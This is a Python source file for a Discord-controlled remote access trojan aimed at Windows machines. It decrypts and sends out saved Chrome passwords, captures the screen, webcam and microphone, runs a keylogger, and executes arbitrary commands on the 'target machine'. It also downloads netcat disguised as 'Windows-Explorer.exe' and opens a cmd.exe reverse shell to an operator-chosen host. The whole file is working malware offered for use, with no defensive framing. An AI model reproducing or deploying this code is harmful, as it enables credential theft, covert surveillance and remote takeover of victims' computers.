import discord
from discord.ext import commands
import os
import subprocess as sp
import base64
import json
import shutil
import sqlite3
import csv
import re
from Cryptodome.Cipher import AES
import win32crypt
import cv2  # Ensure you have opencv-python installed
import threading
from pynput import keyboard  # Ensure you have pynput installed
import requests  # Ensure you have requests installed
from soundfile import write  # Ensure you have soundfile installed
from sounddevice import rec, wait  # Ensure you have sounddevice installed
import tempfile
import pyautogui
# Helper function to run a command
def run_command(command):
    result = sp.Popen(command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
    out, err = result.communicate()
    result.wait()
    return out if not err else err

# Constants
GUILD_ID = "1269910214468173914"  
CHANNEL_ID = "1269910214468173917"  
# Chrome function to extract passwords
def chrome():
    CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

    def get_secret_key():
        try:
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print(str(e))
            print("[ERR] Chrome secret key cannot be found")
            return None

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            print(str(e))
            print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""

    def get_db_connection(chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db")
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print(str(e))
            print("[ERR] Chrome database cannot be found")
            return None

    try:
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "url", "username", "password"])
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
            data_dict = {}
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if url and username and ciphertext:
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            data_dict[index] = {
                                "URL": url,
                                "User Name": username,
                                "Password": decrypted_password
                            }
                            csv_writer.writerow([index, url, username, decrypted_password])
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
            return data_dict
    except Exception as e:
        return f"[ERR] {str(e)}"

# Function to take a screenshot using the webcam
def webshot():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        path = os.path.join(os.environ["temp"], "p.png")
        if ret:
            cv2.imwrite(path, frame)
            cam.release()
            return path
        else:
            cam.release()
            return False
    except Exception as e:
        print(str(e))
        return False

# Keylogger variables
keylog = []
keylog_active = False
keylog_lock = threading.Lock()
keylog_thread = None
keylogger_listener = None

def on_press(key):
    global keylog
    with keylog_lock:
        if keylog_active:
            try:
                keylog.append(key.char)
            except AttributeError:
                keylog.append(f"[{key}]")

def start_keylogger():
    global keylog_active
    global keylog_thread
    global keylogger_listener
    with keylog_lock:
        keylog_active = True
    def keylogger():
        global keylogger_listener
        keylogger_listener = keyboard.Listener(on_press=on_press)
        keylogger_listener.start()
        keylogger_listener.join()
    keylog_thread = threading.Thread(target=keylogger)
    keylog_thread.start()
    print("Keylogger started.")

def stop_keylogger():
    global keylog_active
    global keylogger_listener
    with keylog_lock:
        keylog_active = False
    if keylogger_listener is not None:
        keylogger_listener.stop()  # Stop the listener
        keylogger_listener.join()  # Wait for the listener thread to exit
    if keylog_thread is not None:
        keylog_thread.join()  # Wait for the keylogger thread to finish
    print("Keylogger stopped.")

def dump_keylog():
    with keylog_lock:
        return ''.join(keylog)

# Function for reverse shell
def revshell(ip, port):
    def exec(IP, PORT):
        if not os.path.exists(os.environ["temp"] + '\\Windows-Explorer.exe'):
            r = requests.get("https://github.com/int0x33/nc.exe/raw/master/nc64.exe", allow_redirects=True, verify=False)
            open(os.environ["temp"] + '\\Windows-Explorer.exe', 'wb').write(r.content)
        try:
            result = sp.Popen(f"{os.environ['temp']}\\Windows-Explorer.exe {IP} {PORT} -e cmd.exe /b", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
            out, err = result.communicate()
            result.wait()
            return True
        except Exception:
            return False

    threading.Thread(target=exec, args=(ip, port)).start()
    return True

def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception:
        USERNAME = "None"
    return USERNAME

def createConfig():
    try:
        path = fr'"C:\Users\{getUsername()}\.config"'
        new_path = path[1:]
        new_path = new_path[:-1]
        os.mkdir(new_path)
        os.system(f"attrib +h {path}")
        path = fr'C:\Users\{getUsername()}\.config\uploads'
        os.mkdir(path)
        return True

    except WindowsError as e:
        if e.winerror == 183:
            return False

# Function to record audio from the microphone
def recordmic(seconds):
    try:
        fs = 44100
        recording = rec(int(seconds * fs), samplerate=fs, channels=2)
        wait()
        os.chdir(fr"C:\Users\{getUsername()}")
        write('recording.wav', fs, recording)
        path = fr"C:\Users\{getUsername()}"
        return path
    except Exception as e:
        print(e)
        return False

# Custom Bot Class
class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents, help_command=None)
        self.channel = None
        

    async def on_ready(self):
        self.channel = self.get_channel(CHANNEL_ID)
        print(f'Logged in as {self.user} (ID: {self.user.id})')
        print(f'Connected to {self.guilds}')

    async def setup_hook(self):
        await self.tree.sync(guild=discord.Object(id=GUILD_ID))

    async def on_command_error(self, ctx, error):
        embed = discord.Embed(title="Error", description=str(error), color=discord.Color.red())
        await ctx.send(embed=embed)

# Initialize the bot
bot = Bot()

@bot.hybrid_command(name="cmd", with_app_command=True, description="Run any command on the target machine")
@commands.guild_only()
async def cmd(ctx: commands.Context, command: str):
    result = run_command(command)
    if len(result) > 2000:  # Discord message limit is 2000 characters
        path = os.path.join(os.environ["temp"], "response.txt")
        with open(path, 'w') as file:
            file.write(result)
        await ctx.reply(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.reply(f"```{result}```")

# Command: Take Screenshot
@bot.hybrid_command(name="screenshot", with_app_command=True, description="Take a screenshot of the current screen")
@commands.guild_only()
async def screenshot(ctx: commands.Context):
    try:
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        await ctx.send(file=discord.File(screenshot_path))
        os.remove(screenshot_path)  # Clean up the file after sending
    except Exception as e:
        await ctx.send(f"An error occurred while taking the screenshot: {e}")

# Command: Extract Chrome Passwords
@bot.hybrid_command(name="chrome_passwords", with_app_command=True, description="Extract Chrome passwords")
@commands.guild_only()
async def chrome_passwords(ctx: commands.Context):
    try:
        data = chrome()
        if isinstance(data, dict) and data:
            output = "Extracted Chrome Passwords:\n"
            for index, info in data.items():
                output += f"Index: {index}\nURL: {info['URL']}\nUsername: {info['User Name']}\nPassword: {info['Password']}\n\n"
            if len(output) > 2000:
                path = os.path.join(os.environ["temp"], "chrome_passwords.txt")
                with open(path, 'w') as file:
                    file.write(output)
                await ctx.reply(file=discord.File(path))
                os.remove(path)
            else:
                await ctx.reply(f"```\n{output}```")
        else:
            await ctx.reply("No passwords found or an error occurred.")
    except Exception as e:
        await ctx.reply(f"An error occurred: {e}")


# Command: Take Webcam Screenshot
@bot.hybrid_command(name="webshot", with_app_command=True, description="Take a screenshot using the webcam")
@commands.guild_only()
async def webshot_cmd(ctx: commands.Context):
    try:
        path = webshot()
        if path:
            await ctx.send(file=discord.File(path))
            os.remove(path)  # Clean up the file after sending
        else:
            await ctx.send("Failed to capture webcam image.")
    except Exception as e:
        await ctx.send(f"An error occurred while capturing the webcam image: {e}")

# Command: Start Keylogger
@bot.hybrid_command(name="start_keylogger", with_app_command=True, description="Start the keylogger")
@commands.guild_only()
async def start_keylogger_cmd(ctx: commands.Context):
    start_keylogger()
    await ctx.reply("Keylogger started.")

# Command: Stop Keylogger
@bot.hybrid_command(name="stop_keylogger", with_app_command=True, description="Stop the keylogger")
@commands.guild_only()
async def stop_keylogger_cmd(ctx: commands.Context):
    stop_keylogger()
    await ctx.reply("Keylogger stopped.")

# Command: Dump Keylog
@bot.hybrid_command(name="dump_keylog", with_app_command=True, description="Dump the keylogger data")
@commands.guild_only()
async def dump_keylog_cmd(ctx: commands.Context):
    keylog_data = dump_keylog()
    if keylog_data:
        if len(keylog_data) > 2000:  # Discord message limit is 2000 characters
            path = os.path.join(tempfile.gettempdir(), "keylog.txt")
            with open(path, 'w') as file:
                file.write(keylog_data)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply(f"```\n{keylog_data}```")
    else:
        await ctx.reply("No keylog data found.")

# Command: Record Microphone
@bot.hybrid_command(name="recordmic", with_app_command=True, description="Record audio from the microphone")
@commands.guild_only()
async def recordmic_cmd(ctx: commands.Context, seconds: int):
    path = recordmic(seconds)
    if path:
        await ctx.send(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.send("Failed to record audio.")

# Command: Establish Reverse Shell
@bot.hybrid_command(name="revshell", with_app_command=True, description="Get a reverse shell on the target machine")
@commands.guild_only()
async def revshell_cmd(ctx: commands.Context, ip: str, port: int):
    result = revshell(ip, port)
    if result:
        await ctx.reply(f"Attempting to establish a reverse shell to {ip}:{port}.")
    else:
        await ctx.reply("Failed to start the reverse shell.")

# Run the bot with your token
bot.run('')

